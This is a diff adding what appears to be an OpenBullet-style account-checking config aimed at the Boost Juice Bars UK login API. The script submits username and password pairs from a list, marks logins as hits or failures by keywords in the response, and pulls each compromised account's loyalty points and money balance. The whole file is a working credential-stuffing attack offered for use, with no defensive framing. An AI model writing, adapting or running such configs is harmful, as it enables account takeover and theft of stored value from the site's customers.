@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Boost Juice Bars",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-05T19:19:35.249696+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.boostjuicebars.co.uk/api/vibe/user.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "email: <USER>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "pass: <PASS>" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Success\":0" 
+  KEYCHAIN Success OR 
+    KEY "{\"Success\":1,\"AuthToken" 
+PARSE "<SOURCE>" LR "Points\":\"" "\",\"Money\":\"$" -> CAP "Points : " 
+PARSE "<SOURCE>" LR "\",\"Money\":\"$" "\",\"DateOfBirth\":\"" -> CAP "Balance : " "£" "" 
